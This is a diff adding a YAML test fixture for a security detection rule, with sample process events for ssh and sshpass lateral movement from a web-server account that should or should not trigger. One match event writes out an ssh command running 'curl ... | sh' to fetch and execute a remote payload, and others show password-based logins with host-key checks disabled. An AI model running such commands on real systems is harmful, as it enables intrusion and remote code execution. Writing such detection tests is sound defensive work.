@@ -1,0 +1,26 @@
+match:
+  - desc: "space form -o 'StrictHostKeyChecking no'"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 10, "ppid": 4000, "exe": "/usr/bin/ssh", "name": "ssh", "cmdline": "ssh -o StrictHostKeyChecking no -o UserKnownHostsFile /dev/null root@10.0.0.13 id", "args": ["ssh", "-o", "StrictHostKeyChecking no", "-o", "UserKnownHostsFile /dev/null", "root@10.0.0.13", "id"], "uid": 33, "euid": 33, "username": "www-data", "parent": {"pid": 4000, "exe": "/usr/bin/sh", "name": "sh"}}}
+  - desc: "=off and UserKnownHostsFile=none"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 11, "ppid": 4000, "exe": "/usr/bin/ssh", "name": "ssh", "cmdline": "ssh -oStrictHostKeyChecking=off -oUserKnownHostsFile=none root@10.0.0.13 id", "args": ["ssh", "-oStrictHostKeyChecking=off", "-oUserKnownHostsFile=none", "root@10.0.0.13", "id"], "uid": 33, "euid": 33, "username": "www-data", "parent": {"pid": 4000, "exe": "/usr/bin/sh", "name": "sh"}}}
+  - desc: "renamed sshpass"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 13, "ppid": 4000, "exe": "/tmp/.x/kworker", "name": "kworker", "cmdline": "kworker -p Winter2026! ssh -o StrictHostKeyChecking=no root@10.0.0.12 id", "args": ["kworker", "-p", "Winter2026!", "ssh", "-o", "StrictHostKeyChecking=no", "root@10.0.0.12", "id"], "uid": 33, "euid": 33, "username": "www-data", "parent": {"pid": 4000, "exe": "/usr/bin/sh", "name": "sh"}}}
+  - desc: "sshpass logs in to another host with a password"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24701, "ppid": 24000, "exe": "/usr/bin/sshpass", "name": "sshpass", "uid": -1, "euid": -1, "username": "www-data", "cmdline": "sshpass -p Winter2026! ssh -o StrictHostKeyChecking=no root@10.0.0.12 id", "args": ["sshpass", "-p", "Winter2026!", "ssh", "-o", "StrictHostKeyChecking=no", "root@10.0.0.12", "id"], "parent": {"pid": 24000, "exe": "/usr/bin/python3", "name": "python3"}}}
+  - desc: "ssh with host key checking off from a web shell"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24702, "ppid": 24000, "exe": "/usr/bin/ssh", "name": "ssh", "uid": -1, "euid": -1, "username": "www-data", "cmdline": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/.k root@10.0.0.13 curl -s http://198.51.100.7/x|sh", "args": ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-i", "/tmp/.k", "root@10.0.0.13", "curl", "-s", "http://198.51.100.7/x|sh"], "parent": {"pid": 24000, "exe": "/usr/bin/sh", "name": "sh"}}}
+nomatch:
+  - desc: "benign lookalike - interactive ssh with defaults"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24711, "ppid": 24000, "exe": "/usr/bin/ssh", "name": "ssh", "uid": -1, "euid": -1, "username": "alice", "cmdline": "ssh alice@bastion.example.org", "args": ["ssh", "alice@bastion.example.org"], "parent": {"pid": 24000, "exe": "/usr/bin/bash", "name": "bash"}}}
+  - desc: "ssh with only StrictHostKeyChecking=accept-new"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24712, "ppid": 24000, "exe": "/usr/bin/ssh", "name": "ssh", "uid": -1, "euid": -1, "username": "alice", "cmdline": "ssh -o StrictHostKeyChecking=accept-new git@github.com", "args": ["ssh", "-o", "StrictHostKeyChecking=accept-new", "git@github.com"], "parent": {"pid": 24000, "exe": "/usr/bin/bash", "name": "bash"}}}
+  - desc: "ssh-keyscan collects host keys"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24713, "ppid": 24000, "exe": "/usr/bin/ssh-keyscan", "name": "ssh-keyscan", "uid": -1, "euid": -1, "username": "alice", "cmdline": "ssh-keyscan -H 10.0.0.12", "args": ["ssh-keyscan", "-H", "10.0.0.12"], "parent": {"pid": 24000, "exe": "/usr/bin/bash", "name": "bash"}}}
